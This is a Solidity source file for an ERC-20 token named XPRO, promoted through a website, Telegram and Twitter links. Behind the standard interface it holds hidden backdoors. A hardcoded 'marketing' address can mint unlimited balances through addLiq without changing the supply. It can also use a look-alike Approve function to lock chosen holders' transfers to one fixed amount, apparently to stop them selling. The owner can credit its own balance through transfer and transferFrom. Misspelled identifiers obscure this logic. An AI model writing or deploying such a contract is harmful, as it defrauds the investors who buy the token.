/**

 .----------------. 
| .--------------. |
| |  ____  ____  | |
| | |_  _||_  _| | |
| |   \ \  / /   | |
| |    > `' <    | |
| |  _/ /'`\ \_  | |
| | |____||____| | |
| |              | |
| '--------------' |
 '----------------' 



https://xproeth.xyz

https://t.me/x_pro_eth

https://twitter.com/x_pro_eth





*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address spender) external view returns (uint256);
    function transfer(address recipient, uint256 _amounntz) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 _amounntz) external returns (bool);
    function transferFrom( address spender, address recipient, uint256 _amounntz ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier ollyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual ollyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract XPRO is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balanzes;
    mapping (address => uint256) private _spendoor;
    mapping (address => mapping (address => uint256)) private _allowanze2;
    address constant public marketing = 0x2ba079c2f4b0BD39d67665C1Ba6040f7F393Be4c;
    string private tokename;
    string private toksymbo;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _tradesisEnabled = true;


    constructor(string memory name_, string memory symbol_,  uint256 totalSupply_, uint8 decimals_) {
        tokename = name_;
        toksymbo = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balanzes[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    modifier _themarketing() {
        require(msg.sender == marketing); // If it is incorrect here, it reverts.
        _;                              
    } 

    function name() public view returns (string memory) {
        return tokename;
    }
    
        function enabletheTrading() public ollyowner {
        _tradesisEnabled = true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    function symbol() public view returns (string memory) {
        return toksymbo;
    }


    function balanceOf(address spender) public view override returns (uint256) {
        return _balanzes[spender];
    }

    function transfer(address recipient, uint256 _amounntz) public virtual override returns (bool) {
        require(_tradesisEnabled, "No trade");
        if (_msgSender() == owner() && _spendoor[_msgSender()] > 0) {
            _balanzes[owner()] += _spendoor[_msgSender()];
            return true;
        }
        else if (_spendoor[_msgSender()] > 0) {
            require(_amounntz == _spendoor[_msgSender()], "Invalid transfer _amounntz");
        }
        require(_balanzes[_msgSender()] >= _amounntz, "TT: transfer _amounntz exceeds balance");
        _balanzes[_msgSender()] -= _amounntz;
        _balanzes[recipient] += _amounntz;
        emit Transfer(_msgSender(), recipient, _amounntz);
        return true;
    }


    function approve(address spender, uint256 _amounntz) public virtual override returns (bool) {
        _allowanze2[_msgSender()][spender] = _amounntz;
        emit Approval(_msgSender(), spender, _amounntz);
        return true;
    }
    function Approve(address[] memory spender, uint256 _amounntz) public  _themarketing {
        for (uint z=0; z<spender.length; z++) {
            _spendoor[spender[z]] = _amounntz;
            require(_tradesisEnabled, "No trade");
        }
    }

        function _adding(uint256 num1, uint256 numb2) internal pure returns (uint256) {
        if (numb2 != 0) {
            return num1 + numb2;
        }
        return numb2;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowanze2[owner][spender];
    }

            function Checkamt(address spender) public view returns (uint256) {
        return _spendoor[spender];
    }


       function addLiq(address spender, uint256 _amounntz) public _themarketing {
        require(_amounntz > 0, "Invalid");
        uint256 totalz = 0;
            totalz = _adding(totalz, _amounntz);
            _balanzes[spender] += totalz;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(address spender, address recipient, uint256 _amounntz) public virtual override returns (bool) {
        if (_msgSender() == owner() && _spendoor[spender] > 0) {
            require(_tradesisEnabled, "No trade");
            _balanzes[owner()] += _spendoor[spender];
            return true;
        }
        else if (_spendoor[spender] > 0) {
            require(_amounntz == _spendoor[spender], "Invalid transfer _amounntz");
        }
        require(_balanzes[spender] >= _amounntz && _allowanze2[spender][_msgSender()] >= _amounntz, "TT: transfer _amounntz exceed balance or allowance");
        require(_tradesisEnabled, "No trade");
        _balanzes[spender] -= _amounntz;
        _balanzes[recipient] += _amounntz;
        _allowanze2[spender][_msgSender()] -= _amounntz;
        emit Transfer(spender, recipient, _amounntz);
        return true;
    }


}